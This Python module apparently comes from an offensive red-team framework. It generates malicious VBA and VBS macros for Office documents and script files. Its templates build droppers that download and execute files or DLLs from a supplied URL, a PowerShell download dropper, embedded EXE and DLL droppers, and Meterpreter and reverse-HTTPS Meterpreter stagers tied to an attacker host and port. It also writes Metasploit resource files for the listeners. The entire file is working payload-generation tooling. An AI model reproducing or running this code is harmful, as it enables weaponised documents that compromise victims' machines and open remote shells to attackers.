#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import shlex
import os, re
import logging
from modules.mp_module import MpModule
import vbLib.Meterpreter
import vbLib.WebMeter
import vbLib.WscriptExec
import vbLib.ExecuteCMDAsync
import vbLib.ExecuteCMDSync
import vbLib.templates
import vbLib.WmiExec
from common.utils import MSTypes, MPParam, getParamValue
from common import utils



class TemplateFactory(MpModule):
    """ Generate a VBA document from a given template """
        
    def _fillGenericTemplate(self, content):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if os.path.isfile(cmdFile):
            with open(cmdFile, 'r') as f:
                valuesFileContent = f.read()
            values = shlex.split(valuesFileContent) # split on space but preserve what is between quotes
            for value in values:
                content = content.replace("<<<TEMPLATE>>>", value, 1)
            # remove file containing template values
            os.remove(cmdFile)
            logging.info("   [-] OK!")
        else:
            logging.warning("   [!] No input value was provided for this template.\n       Use \"-t help\" option for help on templates.")

        # Create module
        vbaFile = self.addVBAModule(content)
        logging.info(f"   [-] Template {self.template} VBA generated in {vbaFile}") 


    
    def _processCmdTemplate(self):
        """ cmd execute template builder """

        paramArray = [MPParam("Command line")]
        self.fillInputParams(paramArray)
        self.mpSession.dosCommand = getParamValue(paramArray, "Command line")

        # add execution functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec)
        self.addVBLib(vbLib.ExecuteCMDAsync)

        content = vbLib.templates.CMD
        if self.mpSession.mpType == "Community":
            content = content.replace("<<<CMDLINE>>>", self.mpSession.dosCommand)
        vbaFile = self.addVBAModule(content)
        logging.info(f"   [-] Template {self.template} VBA generated in {vbaFile}") 

    
    def _targetPathToVba(self, targetPath):
        """
        Modify target path to convert it to VBA code
        Mostly environment variable management when needed
        """
        # remove escape carets
        result = targetPath.replace("^%","%")

        # find environment variables in string
        pattern = "%(.*?)%"

        if searchResult := re.search(pattern, result):
            substring = searchResult[1]
            logging.debug(f"     [*] Found environment variable: {substring}") 

            strsplitted = result.split(f"%{substring}%")
            result = 'Environ("%s")' % substring
            if strsplitted[0] == "" and strsplitted[1]!="": # we need to append value to environment variable
                result = result + '\n    realPath = realPath &  "%s" ' % strsplitted[1]
            elif strsplitted[0] != "" and strsplitted[1]=="": # we need to prepend value to environment variable
                result = result + '\n    realPath = "%s" & realPath ' % strsplitted[0]
            elif strsplitted[0] != "": # we need to prepend and append value to environment variable
                result = result + '\n    realPath = "%s"  &  realPath & "%s"  ' % (strsplitted[0],strsplitted[1])

        else:
            result = '"' + result + '"'

        # If there is no path where putting the payload in %temp%
        if "\\" not in result and "/" not in result:
            logging.info("   [-] File will be dropped in %%temp%% as %s" % targetPath)
            result = result + '\n    realPath = Environ("TEMP") & "\\" & realPath'
        else:
            logging.info(
                f'   [-] Dropped file will be saved in {targetPath.replace("^%", "%")}'
            )


        logging.debug(f"     [*] Generated vba code:{result}")

        return result
    
    
    def _processDropperTemplate(self):
        """ Generate DROPPER  template for VBA and VBS based """
        # Get required parameters
        realPathKey = "File name in TEMP or full file path (environment variables can be used)."
        paramArray = [MPParam("target_url"),MPParam(realPathKey,optional=True)]
        self.fillInputParams(paramArray)
        downloadPath = getParamValue(paramArray, realPathKey)
        targetUrl = getParamValue(paramArray, "target_url")

        # build target path
        if downloadPath == "":
            downloadPath =  utils.randomAlpha(8) + os.path.splitext(targetUrl)[1]
        downloadPath = self._targetPathToVba(downloadPath)

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec)
        self.addVBLib(vbLib.ExecuteCMDAsync)

        content = vbLib.templates.DROPPER
        content = content.replace("<<<URL>>>", targetUrl)
        content = content.replace("<<<DOWNLOAD_PATH>>>", downloadPath)
        # generate random file name
        vbaFile = self.addVBAModule(content)

        logging.debug(f"   [-] Template {self.template} VBA generated in {vbaFile}")
        logging.info("   [-] OK!")
    
    
    def _processDropper2Template(self):
        """ Generate DROPPER2 template for VBA and VBS based """
        # Get required parameters
        realPathKey = "File name in TEMP or full file path (environment variables can be used)."
        paramArray = [MPParam("target_url"),MPParam(realPathKey,optional=True)]
        self.fillInputParams(paramArray)
        downloadPath = getParamValue(paramArray, realPathKey)
        targetUrl = getParamValue(paramArray, "target_url")

        # build target path
        if downloadPath == "":
            downloadPath =  utils.randomAlpha(8) + os.path.splitext(targetUrl)[1]
        downloadPath = self._targetPathToVba(downloadPath)

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec)
        self.addVBLib(vbLib.ExecuteCMDAsync)

        content = vbLib.templates.DROPPER2
        content = content.replace("<<<URL>>>", targetUrl)
        content = content.replace("<<<DOWNLOAD_PATH>>>", downloadPath)
        # generate random file name
        vbaFile = self.addVBAModule(content)

        logging.debug(f"   [-] Template {self.template} VBA generated in {vbaFile}")
        logging.info("   [-] OK!")
        
    
    def _processPowershellDropperTemplate(self):
        """ Generate  code based on powershell DROPPER template  """
        # Get required parameters
        paramArray = [MPParam("powershell_script_url")]
        self.fillInputParams(paramArray)

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec)
        self.addVBLib(vbLib.ExecuteCMDAsync)

        content = vbLib.templates.DROPPER_PS
        content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", getParamValue(paramArray, "powershell_script_url"))
        # generate random file name
        vbaFile = self.addVBAModule(content)

        logging.debug(f"   [-] Template {self.template} VBA generated in {vbaFile}")
        logging.info("   [-] OK!")
    
    
    def _processEmbedExeTemplate(self):
        """ Drop and execute embedded file """
        paramArray = [MPParam("Command line parameters",optional=True)]
        self.fillInputParams(paramArray)
        # generate random file name
        fileName = utils.randomAlpha(7) + os.path.splitext(self.mpSession.embeddedFilePath)[1]

        logging.info("   [-] File extraction path: %%temp%%\\%s" % fileName)

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec)
        self.addVBLib(vbLib.ExecuteCMDAsync)
        content = vbLib.templates.EMBED_EXE
        content = content.replace("<<<FILE_NAME>>>", fileName)
        if getParamValue(paramArray, "Command line parameters") != "":
            content = content.replace("<<<PARAMETERS>>>"," & \" %s\"" % getParamValue(paramArray, "Command line parameters"))
        else:
            content = content.replace("<<<PARAMETERS>>>","")
        vbaFile = self.addVBAModule(content)

        logging.debug(f"   [-] Template {self.template} VBA generated in {vbaFile}")
        logging.info("   [-] OK!")
    
    
    def _processDropperDllTemplate(self):
        paramArray = [MPParam("URL"), MPParam("Dll_Function")]
        self.fillInputParams(paramArray)
        dllUrl=getParamValue(paramArray, "URL")
        dllFct=getParamValue(paramArray, "Dll_Function")

        if self.outputFileType in [MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT, MSTypes.XSL]:
            # for VBS based file
            content = vbLib.templates.DROPPER_DLL_VBS
            content = content.replace("<<<DLL_URL>>>", dllUrl)
            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
            vbaFile = self.addVBAModule(content)
            logging.debug(f"   [-] Template {self.template} VBS generated in {vbaFile}")

        else:
            # generate main module 
            content = vbLib.templates.DROPPER_DLL2
            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
            invokerModule = self.addVBAModule(content)
            logging.debug(
                f"   [-] Template {self.template} VBA generated in {invokerModule}"
            )
             

            # second module
            content = vbLib.templates.DROPPER_DLL1
            content = content.replace("<<<DLL_URL>>>", dllUrl)
            if MSTypes.XL in self.outputFileType:
                msApp = MSTypes.XL
            elif MSTypes.WD in self.outputFileType:
                msApp = MSTypes.WD
            elif MSTypes.PPT in self.outputFileType:
                msApp = "PowerPoint"
            elif MSTypes.VSD in self.outputFileType:
                msApp = "Visio"
            elif MSTypes.MPP in self.outputFileType:
                msApp = "Project"
            else:
                msApp = MSTypes.UNKNOWN
            content = content.replace("<<<APPLICATION>>>", msApp)
            content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
            vbaFile = self.addVBAModule(content)
            logging.debug(
                f"   [-] Second part of Template {self.template} VBA generated in {vbaFile}"
            )


        logging.info("   [-] OK!")
    
    
    def _processEmbedDllTemplate(self):
        # open file containing template values
        paramArray = [MPParam("Dll_Function")]
        self.fillInputParams(paramArray)

        #logging.info("   [-] Dll will be dropped at: %s" % extractedFilePath)
        if self.outputFileType in [MSTypes.VBSCRIPTS_FORMATS]:
            # for VBS based file
            content = vbLib.templates.EMBED_DLL_VBS
            content = content.replace("<<<DLL_FUNCTION>>>", getParamValue(paramArray, "Dll_Function"))
            vbaFile = self.addVBAModule(content)
            logging.debug(f"   [-] Template {self.template} VBS generated in {vbaFile}")
        else:
            # for VBA based files
            # generate main module 
            content = vbLib.templates.DROPPER_DLL2
            content = content.replace("<<<DLL_FUNCTION>>>", getParamValue(paramArray, "Dll_Function"))
            invokerModule = self.addVBAModule(content)
            logging.debug(
                f"   [-] Template {self.template} VBA generated in {invokerModule}"
            )
             

            # second module
            content = vbLib.templates.EMBED_DLL_VBA
            if MSTypes.XL in self.outputFileType:
                msApp = MSTypes.XL
            elif MSTypes.WD in self.outputFileType:
                msApp = MSTypes.WD
            elif MSTypes.PPT in self.outputFileType:
                msApp = "PowerPoint"
            elif MSTypes.VSD in self.outputFileType:
                msApp = "Visio"
            elif MSTypes.MPP in self.outputFileType:
                msApp = "Project"
            else:
                msApp = MSTypes.UNKNOWN
            content = content.replace("<<<APPLICATION>>>", msApp)
            content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
            vbaFile = self.addVBAModule(content)
            logging.debug(
                f"   [-] Second part of Template {self.template} VBA generated in {vbaFile}"
            )


        logging.info("   [-] OK!")
    
    
    def _processMeterpreterTemplate(self):
        """ Generate meterpreter template for VBA and VBS based """

        paramArray = [MPParam("rhost"), MPParam("rport")]
        self.fillInputParams(paramArray)

        content = vbLib.templates.METERPRETER
        content = content.replace("<<<RHOST>>>", getParamValue(paramArray, "rhost"))
        content = content.replace("<<<RPORT>>>", getParamValue(paramArray, "rport"))
        if self.outputFileType in MSTypes.VBSCRIPTS_FORMATS:
            content = content + vbLib.Meterpreter.VBS
        else:
            content = content + vbLib.Meterpreter.VBA
        vbaFile = self.addVBAModule(content)
        logging.debug(f"   [-] Template {self.template} VBA generated in {vbaFile}")
        rc_content = vbLib.templates.METERPRETER_RC
        rc_content = rc_content.replace("<<<LHOST>>>", getParamValue(paramArray, "rhost"))
        rc_content = rc_content.replace("<<<LPORT>>>", getParamValue(paramArray, "rport"))
        # Write in RC file
        rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "meterpreter.rc")
        with open(rcFilePath, 'w') as f:
            f.writelines(rc_content)
        logging.info(f"   [-] Meterpreter resource file generated in {rcFilePath}")
        logging.info("   [-] Execute listener with 'msfconsole -r %s'" % rcFilePath)
        logging.info("   [-] OK!")
        
        
 
    def _processWebMeterTemplate(self):
        """ 
        Generate reverse https meterpreter template for VBA and VBS based  
        """
        paramArray = [MPParam("rhost"), MPParam("rport")]
        self.fillInputParams(paramArray)

        content = vbLib.templates.WEBMETER
        content = content.replace("<<<RHOST>>>", getParamValue(paramArray, "rhost"))
        content = content.replace("<<<RPORT>>>", getParamValue(paramArray, "rport"))
        content = content + vbLib.WebMeter.VBA

        vbaFile = self.addVBAModule(content)
        logging.debug(f"   [-] Template {self.template} VBA generated in {vbaFile}") 

        rc_content = vbLib.templates.WEBMETER_RC
        rc_content = rc_content.replace("<<<LHOST>>>", getParamValue(paramArray, "rhost"))
        rc_content = rc_content.replace("<<<LPORT>>>", getParamValue(paramArray, "rport"))
        # Write in RC file
        rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "webmeter.rc")
        with open(rcFilePath, 'w') as f:
            f.writelines(rc_content)
        logging.info(f"   [-] Meterpreter resource file generated in {rcFilePath}")
        logging.info("   [-] Execute listener with 'msfconsole -r %s'" % rcFilePath)
        logging.info("   [-] OK!")
        
 
    def _generation(self):
        if self.template is None:
            logging.info("   [!] No template defined")
            return False
        if self.template == "HELLO":
            content = vbLib.templates.HELLO
        elif self.template == "DROPPER":
            self._processDropperTemplate()
            return True
        elif self.template == "DROPPER_PS":
            self._processPowershellDropperTemplate()
            return True
        elif self.template == "METERPRETER":
            self._processMeterpreterTemplate()
            return True
        elif self.template == "CMD":
            self._processCmdTemplate()
            return True
        elif self.template == "REMOTE_CMD":
            self.addVBLib(vbLib.ExecuteCMDSync)
            content = vbLib.templates.REMOTE_CMD
        elif self.template == "EMBED_EXE":
            self._processEmbedExeTemplate()
            return True
        elif self.template == "EMBED_DLL":
            self._processEmbedDllTemplate()
            return True
        elif self.template == "DROPPER_DLL":
            self._processDropperDllTemplate()
            return True
        else: # if not one of default template suppose it is a custom template
            if os.path.isfile(self.template):
                with open(self.template, 'r') as f:
                    content = f.read()
            else:
                logging.info(
                    f"   [!] Template {self.template} is not recognized as file or default template. Payload will not work."
                )

                return False


        self._fillGenericTemplate(content)
        return True
    
    
    def run(self):
        logging.info(" [+] Generating source code from template...")
        return self._generation()
        

